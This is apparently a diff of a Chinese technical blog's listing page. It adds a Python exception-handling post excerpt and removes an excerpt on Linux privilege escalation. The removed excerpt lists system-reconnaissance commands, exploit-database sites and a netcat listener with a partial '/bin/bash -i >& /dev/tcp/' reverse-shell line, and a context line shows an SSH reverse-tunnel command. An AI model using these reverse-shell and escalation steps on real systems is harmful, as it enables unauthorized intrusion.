@@ -82,6 +82,56 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/python-exception-handling/">Python的异常处理</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-26</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 Python异常处理 #!/usr/bin/env python # -*- coding: utf-8 -*- try: try: # 可嵌套 str(&quot;aaaaa&quot;) # int(&quot;aaaaa&quot;) # print a # print 1/0 except (TypeError, IndexError, ValueError): #捕获多种异常 print &quot;TypeErrorZero or DivisionError or ValueError&quot; except ZeroDivisionError as aa: #捕获除零错误 print aa #输出详细错误信息 except: print u&quot;发生其他异常则执行这里&quot; else: print u&quot;上面没有出错才输出这里&quot; a = [1,2,3] print a[4] #这里出错，会向上抛出错误，最终输出this is error finally: print u&quot;不管是否出错都输出这里，一般用于释放资源，如关闭文件&quot; except Exception as e: #可捕获所有异常类型 print &quot;this is error&quot; print e  
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/metasploit-usage/">Metasploit的简单使用</a></h2>
 
         
@@ -561,61 +611,6 @@ B上先运行： ssh -NfR 8888:localhost:22 reber@A-IP 输入主机A的用户reb
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/">Linux下系统漏洞提权</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-08-09</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
-1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &gt;&amp; /dev/tcp/10.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/linux-use-system-vulnerabilities-elevate-privileges/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -662,7 +657,7 @@ B上先运行： ssh -NfR 8888:localhost:22 reber@A-IP 输入主机A的用户reb
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(12)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(34)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(35)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/server" title="server">server(10)</a></li>
         
@@ -772,7 +767,7 @@ B上先运行： ssh -NfR 8888:localhost:22 reber@A-IP 输入主机A的用户reb
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/module" title="module">module</a>
-                <sup>13</sup>
+                <sup>14</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -812,7 +807,7 @@ B上先运行： ssh -NfR 8888:localhost:22 reber@A-IP 输入主机A的用户reb
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/python" title="python">python</a>
-                <sup>32</sup>
+                <sup>33</sup>
             </p>
         
             <p style="display:inline-block;">
